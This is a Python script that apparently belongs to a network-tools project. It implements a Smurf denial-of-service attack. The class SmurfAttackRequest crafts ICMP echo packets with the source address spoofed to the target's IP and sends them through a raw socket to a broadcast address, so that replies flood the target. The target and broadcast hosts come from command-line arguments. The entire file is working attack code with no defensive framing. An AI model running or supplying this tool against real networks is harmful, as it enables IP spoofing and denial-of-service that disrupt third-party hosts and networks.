import os
import socket
import sys

from socket import AF_INET, SOCK_RAW, IPPROTO_ICMP
from time import sleep

path = os.path.dirname(os.path.abspath(__file__))
sys.path.append(path[:-9])

from services.utils.ippacket import make_ip_packet
from services.utils.exceptions import BadHostException
from services.requests.pingrequest import PingRequest


class SmurfAttackRequest(PingRequest):
    def __init__(self, target, broadcast, count=5, payload=56, delay=1):
        self.target = target
        self.payload = payload
        self.count = count
        self.delay = delay

        super().__init__(broadcast, size=payload)

        try:
            self.target_ip = socket.gethostbyname(target)
        except socket.error:
            raise BadHostException("unable to resolve target system name {}.".format(target))

    def __make_smurf_packet(self, seq_num):
        payload = self._make_packet(seq_num)
        packet = make_ip_packet(self.host_addr, IPPROTO_ICMP,
                                payload, self.target_ip)

        return packet

    def __send_single_packet(self, sock, seq_num):
        packet = self.__make_smurf_packet(seq_num)
        sock.sendto(packet, (self.host_addr, 0))

    def __send_smurf_packet(self, seq_num):
        with socket.socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as sock:
            sock.bind(('', 1))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            self.__send_single_packet(sock, seq_num)

    def attack(self):
        try:
            for i in range(self.count):
                print("sending smurf to {} via {} [{}]  size={}  num={} of {}".format(self.target_ip,
                                                                                      self.host_name,
                                                                                      self.host_addr,
                                                                                      self.payload,
                                                                                      i + 1,
                                                                                      self.count))
                self.__send_smurf_packet(i)
                sleep(self.delay)
        except socket.gaierror:
            raise
        except PermissionError:
            print("superuser needed")


def main():
    if len(sys.argv) <= 1:
        print("target and broadcast host address not specified")
        sys.exit(1)

    try:
        smurfing = SmurfAttackRequest(sys.argv[1], sys.argv[2], count=5)
        smurfing.attack()
    except BadHostException as errno:
        print(errno)
        pass
    except KeyboardInterrupt:
        print("keyboard interrupt")
        pass
    except:
        raise


if __name__ == '__main__':
    main()